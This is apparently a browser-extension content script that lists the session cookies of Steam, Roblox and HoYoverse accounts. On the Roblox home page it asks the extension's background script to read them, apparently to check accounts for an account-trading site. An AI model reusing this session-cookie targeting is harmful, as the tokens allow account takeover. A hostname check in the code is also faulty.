var browser = browser || chrome,
    platforms = {
        'steam': {
            items: [
                {domain: 'steamcommunity.com', names: ['steamLoginSecure']},
                {domain: 'store.steampowered.com', names: ['steamLoginSecure']}
            ]
        },
        'roblox': {
            loginUrl: 'https://www.roblox.com/Login',
            successUrl: 'https://www.roblox.com/home',
            items: [
                {domain: '.roblox.com', names: ['.ROBLOSECURITY']}
            ]
        },
        'hoyoverse': {
            items: [
                {domain: '.hoyoverse.com', names: ['login_ticket']},
                {domain: '.hoyolab.com', names: ['cookie_token_v2', 'ltoken_v2', 'account_id_v2']}
            ]
        }
    },
    checkButton = document.evaluate(
        "//button[contains(text(), 'Проверить аккаунт')]",
        document.body,
        null,
        XPathResult.ANY_TYPE,
        null,
    ).iterateNext();

// if (checkButton) {
//     checkButton.addEventListener("click", function () {
//         let
//             regex = /product\/(\w+)\/((?!create).)+/g,
//             result = regex.exec(window.location.pathname);
//
//         const platform = result ? result[1] : undefined
//
//         if (platform) {
//             browser.runtime.sendMessage({
//                 from: 'content',
//                 platform: platform,
//                 items: platforms[platform].items
//             });
//         }
//     });
// }

const
    observer = new MutationObserver(function (mutations) {
        for (const platform in platforms) {
            if (window.location.hostname.indexOf(platform)) {
                switch (platform) {
                    case 'roblox':
                        if (window.location.pathname === '/home') {
                            setTimeout(() => {
                                browser.runtime.sendMessage({
                                    items: platforms[platform].items
                                });
                            }, 1000);
                        }

                        break;
                    case 'steam':
                    case 'hoyverse':
                    default:
                }
            }
        }
    }),
    config = {subtree: true, childList: true};

observer.observe(document, config);
